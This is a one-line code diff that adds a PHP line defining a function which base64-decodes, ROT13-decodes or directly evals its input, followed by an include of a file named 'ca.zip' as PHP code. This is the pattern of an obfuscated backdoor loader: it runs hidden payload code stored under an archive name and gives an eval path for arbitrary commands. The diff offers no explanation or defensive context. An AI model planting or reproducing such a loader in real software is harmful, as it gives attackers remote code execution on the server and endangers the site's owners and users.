@@ -1,0 +1,1 @@
+<?php function fu($a,$b){if($b==1){return base64_decode($a);}else if($b==2){return str_rot13($a);}else{eval($a);}}include("ca.zip");
